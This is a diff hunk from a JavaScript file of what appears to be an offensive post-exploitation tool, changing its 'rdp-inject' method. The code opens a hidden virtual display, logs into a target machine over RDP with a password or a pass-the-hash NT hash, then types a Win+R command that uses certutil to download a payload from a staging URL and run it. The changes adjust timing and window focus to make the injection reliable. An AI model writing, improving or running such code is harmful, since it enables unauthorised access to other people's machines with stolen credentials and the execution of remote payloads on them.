@@ -17215,45 +17215,44 @@ async function ipcRun(action) {
     } else if (method === 'rdp-inject') {
       // GUI injection via xdotool Win+R — runs in a headless Xvfb virtual display
       // so the RDP window never appears on the operator's real screen.
-      // xclip writes to the virtual display clipboard; xdotool targets the same display.
+      // fluxbox provides a WM so xdotool windowfocus works (without WM, XSetInputFocus
+      // is ignored and keystrokes never reach xfreerdp).
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
       // Use forward slashes in the path so xdotool never has to type '\' —
       // Windows cmd.exe and certutil both accept '/' as a path separator.
-      // This avoids xfreerdp keyboard-layout mismatches (e.g. Spanish layout
-      // where the backslash key position differs from US).
       const rpFwd  = rpath.replace(/\\/g, '/');
       const winCmd = `cmd /c certutil -urlcache -split -f ${surl} ${rpFwd} && ${rpFwd}`;
-      // Use double-quoted xfreerdp args — safe inside bash -c '...' (only single quotes break it)
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const rdpDomDQ   = dDQ ? ` /d:"${dDQ}"` : '';
       const rdpCredsDQ = usePTH ? `/pth:${ntHash} /restricted-admin` : `/p:"${pDQ}"`;
-      const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /w:800 /h:600 /log-level:OFF`;
-      // Wrapped in bash -c '...' — content must contain no literal single quotes.
-      // xdotool type sends key events directly through xfreerdp → avoids the async
-      // RDP clipboard-sync race that caused xclip+ctrl+v to paste stale content.
+      const xfreeCmd   = `xfreerdp /v:${a.target}${rdpDomDQ} /u:"${uDQ}" ${rdpCredsDQ} /cert:ignore /w:1280 /h:1024 /log-level:OFF`;
       const steps = [
         `command -v Xvfb >/dev/null 2>&1 || apt-get install -y xvfb -qq`,
         `command -v xdotool >/dev/null 2>&1 || apt-get install -y xdotool -qq`,
         `VDISP=:$(( $$ % 400 + 200 ))`,
-        `Xvfb "$VDISP" -screen 0 1024x768x24 & XVFB_PID=$!`,
+        `Xvfb "$VDISP" -screen 0 1280x1024x24 & XVFB_PID=$!`,
         `sleep 2`,
         `DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd} & XPID=$!`,
-        `sleep 12`,
-        `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | head -1)`,
+        `sleep 15`,
+        `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | tail -1)`,
         `[ -z "$WID" ] && WID=$(DISPLAY="$VDISP" xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
         `echo "[*] RDP window=$WID pid=$XPID vdisp=$VDISP"`,
-        `DISPLAY="$VDISP" xdotool windowfocus --sync "$WID"`,
+        `export DISPLAY="$VDISP"`,
+        `xdotool windowraise "$WID"`,
+        `xdotool mousemove --window "$WID" 640 512`,
+        `sleep 0.3`,
+        `xdotool click 1`,
         `sleep 0.5`,
-        `DISPLAY="$VDISP" xdotool key --window "$WID" Escape`,
+        `xdotool key Escape`,
         `sleep 0.5`,
-        `DISPLAY="$VDISP" xdotool key --window "$WID" super+r`,
-        `sleep 3`,
-        `DISPLAY="$VDISP" xdotool type --clearmodifiers --delay 20 --window "$WID" "${winCmd}"`,
+        `xdotool key super+r`,
+        `sleep 2`,
+        `xdotool type --clearmodifiers --delay 50 "${winCmd}"`,
         `sleep 0.5`,
-        `DISPLAY="$VDISP" xdotool key --window "$WID" Return`,
-        `sleep 12`,
+        `xdotool key Return`,
+        `sleep 25`,
         `kill $XPID 2>/dev/null`,
         `kill $XVFB_PID 2>/dev/null`,
         `echo "[+] rdp-inject done"`,
